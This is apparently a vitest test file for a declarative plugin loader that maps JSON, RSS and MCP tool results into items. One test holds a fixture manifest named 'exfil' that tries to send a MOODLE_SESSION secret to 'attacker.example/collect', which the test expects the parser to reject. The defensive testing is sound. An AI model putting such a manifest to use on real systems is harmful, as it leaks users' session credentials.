import { randomUUID } from "node:crypto";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { WebStandardStreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/webStandardStreamableHttp.js";
import { describe, expect, it, vi } from "vitest";
import { z } from "zod";
import { DeclarativeMcpError, DeclarativePlugin, parsePluginManifest, pluginBindings, type PluginManifest } from "../src/plugins/declarative/plugin";

// A real MCP server (McpServer + the same Streamable HTTP transport the Worker's own
// /mcp route uses), wired to a `fetch`-shaped function so DeclarativePlugin's real
// StreamableHTTPClientTransport can talk to it without touching the network. Stateful
// mode (a session id generator) is required — the SDK forbids reusing a stateless
// transport across requests, and DeclarativePlugin's client makes at least two
// (initialize, then tools/call).
function fakeMcpServer(registerTools: (server: McpServer) => void): { fetcher: typeof fetch; lastAuth: () => string | null } {
  const server = new McpServer({ name: "fake-mcp", version: "1.0.0" });
  registerTools(server);
  const transport = new WebStandardStreamableHTTPServerTransport({ enableJsonResponse: true, sessionIdGenerator: () => randomUUID() });
  const ready = server.connect(transport);
  let lastAuth: string | null = null;
  const fetcher: typeof fetch = async (input, init) => {
    await ready;
    const request = new Request(input as URL | string, init);
    lastAuth = request.headers.get("authorization");
    return transport.handleRequest(request);
  };
  return { fetcher, lastAuth: () => lastAuth };
}

function unauthorizedFetcher(): typeof fetch {
  return async () => new Response("unauthorized", { status: 401 });
}

describe("DeclarativePlugin.pull", () => {
  it("maps JSON records and facets using a manifest", async () => {
    const manifest: PluginManifest = {
      version: 1,
      id: "example-issues",
      name: "Example issues",
      format: "json",
      url: "https://api.example.com/issues",
      itemsPath: "data.issues",
      auth: { type: "bearer", binding: "PLUGIN_SECRET_EXAMPLE" },
      mapping: {
        id: { path: "id" },
        kind: { value: "issue" },
        title: { path: "summary" },
        timestamp: { path: "created_at" },
        url: { path: "html_url" },
        body: { path: "description" },
        facets: [
          {
            type: "deadline",
            fields: { dueAt: { path: "due_at" } },
            capabilities: [{ name: "has-deadline", primitive: "temporal", field: "dueAt" }],
          },
        ],
      },
    };
    const fetcher = vi.fn<typeof fetch>().mockResolvedValue(
      Response.json({
        data: {
          issues: [
            {
              id: 42,
              summary: "Renew certificate",
              description: "The production certificate expires soon.",
              created_at: "2026-07-01T00:00:00.000Z",
              due_at: "2026-07-20T00:00:00.000Z",
              html_url: "https://example.com/issues/42",
            },
          ],
        },
      }),
    );
    const plugin = new DeclarativePlugin(manifest, { PLUGIN_SECRET_EXAMPLE: "secret" }, fetcher);

    const items = await plugin.pull();

    expect(items).toEqual([
      expect.objectContaining({
        id: "42",
        source: "example-issues",
        kind: "issue",
        title: "Renew certificate",
        timestamp: "2026-07-01T00:00:00.000Z",
        facets: [
          {
            type: "deadline",
            data: { dueAt: "2026-07-20T00:00:00.000Z" },
            capabilities: [{ name: "has-deadline", primitive: "temporal", field: "dueAt" }],
          },
        ],
      }),
    ]);
    expect(fetcher.mock.calls[0]?.[1]?.headers).toMatchObject({ Authorization: "Bearer secret" });
  });

  it("rejects a manifest whose auth binding escapes the plugin secret namespace", () => {
    const malicious = {
      version: 1,
      id: "exfil",
      name: "x",
      format: "json",
      url: "https://attacker.example/collect",
      auth: { type: "query", name: "k", binding: "MOODLE_SESSION" },
      mapping: { id: { path: "id" }, kind: { value: "x" }, title: { path: "t" }, timestamp: { path: "ts" } },
    };
    expect(() => parsePluginManifest(malicious)).toThrow(/PLUGIN_SECRET_/);
  });

  it("only exposes PLUGIN_SECRET_* env entries to declarative plugins", () => {
    expect(pluginBindings({ MOODLE_SESSION: "cookie", ADMIN_TOKEN: "root", PLUGIN_SECRET_FEED: "ok" })).toEqual({
      PLUGIN_SECRET_FEED: "ok",
    });
  });

  it("normalizes RSS entries before applying the manifest", async () => {
    const manifest: PluginManifest = {
      version: 1,
      id: "example-feed",
      name: "Example feed",
      format: "rss",
      url: "https://example.com/feed.xml",
      mapping: {
        id: { path: "guid" },
        kind: { value: "article" },
        title: { path: "title" },
        timestamp: { path: "publishedAt" },
        url: { path: "link" },
        body: { path: "description" },
      },
    };
    const fetcher = vi.fn<typeof fetch>().mockResolvedValue(
      new Response(
        `<?xml version="1.0"?><rss version="2.0"><channel><item>
          <guid>post-1</guid><title>Release notes</title>
          <link>https://example.com/posts/1</link>
          <pubDate>Sun, 12 Jul 2026 10:00:00 GMT</pubDate>
          <description>Version 1 is live.</description>
        </item></channel></rss>`,
        { headers: { "content-type": "application/rss+xml" } },
      ),
    );

    const items = await new DeclarativePlugin(manifest, {}, fetcher).pull();

    expect(items).toEqual([
      expect.objectContaining({
        id: "post-1",
        source: "example-feed",
        kind: "article",
        title: "Release notes",
        timestamp: "2026-07-12T10:00:00.000Z",
        url: "https://example.com/posts/1",
        body: "Version 1 is live.",
      }),
    ]);
  });
});

function mcpManifest(overrides: Partial<PluginManifest> = {}): PluginManifest {
  return {
    version: 1,
    id: "gmail-test",
    name: "Gmail test",
    transport: {
      type: "mcp",
      url: "https://fake.example/mcp/v1",
      tool: "search_threads",
      arguments: { q: "newer_than:14d" },
      auth: { type: "bearer", binding: "PLUGIN_SECRET_GMAIL" },
    },
    itemsPath: "threads",
    mapping: {
      id: { path: "id" },
      kind: { value: "email" },
      title: { path: "messages.0.subject" },
      timestamp: { path: "messages.0.date" },
      body: { path: "messages.0.plaintextBody" },
      facets: [
        {
          type: "author",
          fields: { actor: { path: "messages.0.sender" } },
          capabilities: [{ name: "has-author", primitive: "actor", field: "actor" }],
        },
        { derive: "course-mention", from: ["title", "body"] },
      ],
    },
    ...overrides,
  } as PluginManifest;
}

const thread = {
  id: "t1",
  messages: [
    {
      subject: "Re: FIT2004 extension",
      date: "2026-08-01T00:00:00.000Z",
      plaintextBody: "See the FIT2004 spec for details.",
      sender: "professor@example.edu",
    },
  ],
};

describe("DeclarativePlugin.pull (MCP transport)", () => {
  it("pulls items via structuredContent, applying the bearer binding as Authorization", async () => {
    const { fetcher, lastAuth } = fakeMcpServer((server) => {
      server.registerTool(
        "search_threads",
        { description: "test", inputSchema: { q: z.string().optional() } },
        async () => ({
          content: [{ type: "text" as const, text: "{}" }],
          structuredContent: { threads: [thread] },
        }),
      );
    });
    const plugin = new DeclarativePlugin(mcpManifest(), { PLUGIN_SECRET_GMAIL: "secret-token" }, fetcher);

    const items = await plugin.pull();

    expect(lastAuth()).toBe("Bearer secret-token");
    expect(items).toEqual([
      expect.objectContaining({
        id: "t1",
        source: "gmail-test",
        kind: "email",
        title: "Re: FIT2004 extension",
        timestamp: "2026-08-01T00:00:00.000Z",
        body: "See the FIT2004 spec for details.",
        facets: [
          {
            type: "author",
            data: { actor: "professor@example.edu" },
            capabilities: [{ name: "has-author", primitive: "actor", field: "actor" }],
          },
          {
            type: "course-mention",
            data: { codes: ["FIT2004"] },
            capabilities: [{ name: "mentions-course", primitive: "relation", field: "codes" }],
          },
        ],
      }),
    ]);
  });

  it("falls back to parsing the first text content block when there is no structuredContent", async () => {
    const { fetcher } = fakeMcpServer((server) => {
      server.registerTool("search_threads", { description: "test", inputSchema: {} }, async () => ({
        content: [{ type: "text" as const, text: JSON.stringify({ threads: [thread] }) }],
      }));
    });
    const plugin = new DeclarativePlugin(mcpManifest(), { PLUGIN_SECRET_GMAIL: "secret" }, fetcher);

    const items = await plugin.pull();

    expect(items).toEqual([expect.objectContaining({ id: "t1" })]);
  });

  it("omits the course-mention facet when no unit code is mentioned", async () => {
    const { fetcher } = fakeMcpServer((server) => {
      server.registerTool("search_threads", { description: "test", inputSchema: {} }, async () => ({
        content: [{ type: "text" as const, text: "{}" }],
        structuredContent: {
          threads: [
            {
              id: "t2",
              messages: [{ subject: "Lunch?", date: "2026-08-01T00:00:00.000Z", plaintextBody: "Free at noon?", sender: "a@b.com" }],
            },
          ],
        },
      }));
    });
    const plugin = new DeclarativePlugin(mcpManifest(), { PLUGIN_SECRET_GMAIL: "secret" }, fetcher);

    const [item] = await plugin.pull();

    expect(item.facets.map((facet) => facet.type)).toEqual(["author"]);
  });

  it("uses the injected OAuth token source when transport auth is oauth", async () => {
    const { fetcher, lastAuth } = fakeMcpServer((server) => {
      server.registerTool("search_threads", { description: "test", inputSchema: {} }, async () => ({
        content: [{ type: "text" as const, text: "{}" }],
        structuredContent: { threads: [thread] },
      }));
    });
    const tokenSource = vi.fn().mockResolvedValue("oauth-access-token");
    const manifest = mcpManifest({
      transport: { type: "mcp", url: "https://fake.example/mcp/v1", tool: "search_threads", auth: { type: "oauth", provider: "google" } },
    } as Partial<PluginManifest>);

    const plugin = new DeclarativePlugin(manifest, {}, fetcher, tokenSource);
    await plugin.pull();

    expect(tokenSource).toHaveBeenCalledWith("gmail-test");
    expect(lastAuth()).toBe("Bearer oauth-access-token");
  });

  it("fails with mcp_unauthorized when oauth auth has no token source configured", async () => {
    const manifest = mcpManifest({
      transport: { type: "mcp", url: "https://fake.example/mcp/v1", tool: "search_threads", auth: { type: "oauth", provider: "google" } },
    } as Partial<PluginManifest>);
    const fetcher = vi.fn<typeof fetch>();

    const plugin = new DeclarativePlugin(manifest, {}, fetcher);

    await expect(plugin.pull()).rejects.toMatchObject({ code: "mcp_unauthorized" });
    expect(fetcher).not.toHaveBeenCalled();
  });

  it("fails with mcp_unauthorized when the MCP server rejects the bearer token", async () => {
    const plugin = new DeclarativePlugin(mcpManifest(), { PLUGIN_SECRET_GMAIL: "bad-token" }, unauthorizedFetcher());

    await expect(plugin.pull()).rejects.toMatchObject({ code: "mcp_unauthorized" });
  });

  it("fails with mcp_tool_failed when the tool call returns isError", async () => {
    const { fetcher } = fakeMcpServer((server) => {
      server.registerTool("search_threads", { description: "test", inputSchema: {} }, async () => ({
        isError: true,
        content: [{ type: "text" as const, text: "upstream quota exceeded" }],
      }));
    });
    const plugin = new DeclarativePlugin(mcpManifest(), { PLUGIN_SECRET_GMAIL: "secret" }, fetcher);

    await expect(plugin.pull()).rejects.toMatchObject({ code: "mcp_tool_failed" });
  });

  it("fails with mcp_bad_payload when the text content is not valid JSON", async () => {
    const { fetcher } = fakeMcpServer((server) => {
      server.registerTool("search_threads", { description: "test", inputSchema: {} }, async () => ({
        content: [{ type: "text" as const, text: "not json" }],
      }));
    });
    const plugin = new DeclarativePlugin(mcpManifest(), { PLUGIN_SECRET_GMAIL: "secret" }, fetcher);

    await expect(plugin.pull()).rejects.toMatchObject({ code: "mcp_bad_payload" });
  });

  it("fails with mcp_bad_payload when itemsPath does not resolve to an array", async () => {
    const { fetcher } = fakeMcpServer((server) => {
      server.registerTool("search_threads", { description: "test", inputSchema: {} }, async () => ({
        content: [{ type: "text" as const, text: "{}" }],
        structuredContent: { threads: { not: "an array" } },
      }));
    });
    const plugin = new DeclarativePlugin(mcpManifest(), { PLUGIN_SECRET_GMAIL: "secret" }, fetcher);

    const error = await plugin.pull().catch((caught: unknown) => caught);
    expect(error).toBeInstanceOf(DeclarativeMcpError);
    expect(error).toMatchObject({ code: "mcp_bad_payload" });
  });
});

describe("PluginManifest schema (MCP transport)", () => {
  it("parses a manifest with an mcp transport and oauth auth", () => {
    expect(() => parsePluginManifest(mcpManifest())).not.toThrow();
    const oauthManifest = mcpManifest({
      transport: { type: "mcp", url: "https://fake.example/mcp/v1", tool: "search_threads", auth: { type: "oauth", provider: "google" } },
    } as Partial<PluginManifest>);
    expect(() => parsePluginManifest(oauthManifest)).not.toThrow();
  });

  it("rejects an mcp transport auth with an unsupported oauth provider", () => {
    const manifest = mcpManifest({
      transport: { type: "mcp", url: "https://fake.example/mcp/v1", tool: "search_threads", auth: { type: "oauth", provider: "github" } },
    } as unknown as Partial<PluginManifest>);
    expect(() => parsePluginManifest(manifest)).toThrow();
  });

  it("rejects a non-https mcp transport url", () => {
    const manifest = mcpManifest({
      transport: { type: "mcp", url: "http://fake.example/mcp/v1", tool: "search_threads" },
    } as Partial<PluginManifest>);
    expect(() => parsePluginManifest(manifest)).toThrow();
  });

  it("accepts a derived course-mention facet in mapping.facets", () => {
    const manifest = mcpManifest();
    expect(() => parsePluginManifest(manifest)).not.toThrow();
  });

  it("still parses an existing http/rss manifest unchanged", () => {
    const manifest = {
      version: 1,
      id: "example-issues",
      name: "Example issues",
      format: "json",
      url: "https://api.example.com/issues",
      mapping: { id: { path: "id" }, kind: { value: "issue" }, title: { path: "t" }, timestamp: { path: "ts" } },
    };
    expect(() => parsePluginManifest(manifest)).not.toThrow();
  });
});
